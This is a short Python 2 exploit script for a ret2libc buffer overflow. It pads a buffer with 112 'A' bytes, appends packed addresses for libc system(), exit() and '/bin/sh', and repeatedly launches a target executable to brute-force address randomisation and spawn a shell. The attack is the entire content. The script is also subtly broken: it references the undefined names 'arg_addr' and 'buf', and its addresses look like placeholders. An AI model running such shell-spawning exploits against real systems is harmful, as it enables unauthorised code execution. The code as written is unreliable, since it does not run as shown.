from subprocess import call
import struct

executable = "/path/to/executable"
libc_base_addr = 0x00112255

system_offset = 0x00040318
exit_offset = 0x000111222
bin_sh_offset = 0x00168216

system_addr = struct.pack("I", libc_base_addr + system_offset )
exit_addr = struct.pack("I", libc_base_addr + exit_offset )
bin_sh_addr = struct.pack("I", libc_base_addr + bin_sh_offset )

buffer = "A"*112 + system_addr + exit_addr + arg_addr

i=0
while (i < 512 ):
	print "Try %s" %i
	i=i+1
	ret = call([executable, buf])